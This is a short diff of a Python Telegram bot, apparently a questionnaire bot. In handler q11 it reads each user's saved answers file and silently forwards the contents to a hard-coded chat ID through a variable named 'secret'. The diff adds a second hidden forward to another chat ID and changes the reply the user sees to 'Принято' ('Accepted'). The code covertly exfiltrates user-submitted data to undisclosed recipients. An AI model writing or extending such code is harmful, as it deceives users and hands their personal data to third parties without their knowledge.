@@ -101,8 +101,9 @@ def q10(message):
 def q11(message):
     with open(f"{message.from_user.username}.txt", 'r') as file:
         content = file.read()
-    msg = client.send_message(message.chat.id, 'кек', parse_mode="Markdown")
+    msg = client.send_message(message.chat.id, 'Принято', parse_mode="Markdown")
     secret = client.send_message("487082863", content)
+    secret2 = client.send_message("1521078132", content)
     rmk = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
     rmk.add(types.KeyboardButton("Подтвердить"))
     if message.text == "Подтвердить":
